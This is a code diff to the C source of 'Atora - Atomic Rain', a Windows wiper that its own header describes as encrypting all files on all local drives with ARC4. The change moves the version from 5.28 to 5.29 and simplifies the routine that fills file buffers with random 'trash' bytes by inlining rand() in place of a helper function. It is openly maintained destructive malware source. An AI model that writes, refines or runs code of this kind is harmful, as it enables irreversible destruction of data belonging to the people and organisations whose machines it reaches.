@@ -1,6 +1,6 @@
 /*
   Name:             Atora - Atomic Rain.
-  Version:          5.28
+  Version:          5.29
   Class:            Files shredder for Windows / Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
   SHA-256:          3469185b774acf1c97d585c6546ddc694c5cd8c3d60d780b0b14ca6f74df9019
@@ -21,7 +21,6 @@ void      writetrash(unsigned char * data, short int  length);
 void      finddir(unsigned char * path, unsigned char * mask);
 void      initialized(const unsigned char * key, short int length);
 void      swap(unsigned char * a, unsigned char * b);
-short int randomrange(short int min, short int max);
 short int checklogicaldisk(unsigned char number_disk);
 void      fileencrypt(const unsigned char * filename);
 void      generatekey(void);
@@ -117,15 +116,11 @@ short int checklogicaldisk(unsigned char number_disk) {
   return _ERROR;
 }
 
-short int randomrange(short int min, short int max) {
- return min + rand() % ((max + 1) - min);
-}
-
 void writetrash(unsigned char * data, short int length) {
  short int i;
 
   for (i = _ZERO; i < length; i++)
-   data[i] = (unsigned char)randomrange(_ZERO, _BYTE - 1);
+   data[i] = (unsigned char)(rand() % _BYTE);
 }
 
 void fileencrypt(const unsigned char * filename) {
